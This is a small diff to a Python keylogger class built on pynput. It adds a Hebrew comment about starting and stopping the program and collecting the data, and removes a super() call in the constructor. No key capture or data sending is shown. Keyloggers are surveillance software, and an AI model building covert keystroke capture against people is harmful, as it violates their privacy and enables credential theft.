@@ -1,10 +1,9 @@
 from pynput import keyboard
 from interfaces import IkeyLogger
 
-
+# פונקציה להתחחלת הפעולה עם התוכנית סוף הפעולה וקבלת המידע
 class KeyLoggerService(IkeyLogger):
     def __init__(self):
-        super().__init__()
         self.logged_keys = []
         self.listener = None
 
